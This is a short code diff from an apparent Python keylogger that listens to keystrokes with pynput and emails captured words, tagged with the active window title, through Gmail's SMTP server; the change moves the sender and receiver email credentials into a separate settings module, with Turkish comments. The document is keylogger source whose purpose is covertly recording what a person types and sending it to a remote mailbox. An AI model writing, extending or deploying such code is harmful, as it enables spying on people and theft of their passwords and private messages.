@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener
 from datetime import datetime
 import smtplib
 from email.mime.text import MIMEText
-
+import settings
 capsLock = False
 word = []
 
@@ -27,9 +27,9 @@ def send_email(window_title, word):
     # E-posta ayarlarını burada yapılandırın
     smtp_server = 'smtp.gmail.com'
     smtp_port = 587
-    sender_email = ''
-    sender_password = ''
-    receiver_email = ''
+    sender_email = settings.sender_email
+    sender_password = settings.sender_password
+    receiver_email = settings.receiver_email
 
     # E-posta gövdesini oluşturun
     subject = f"Word from {window_title}"
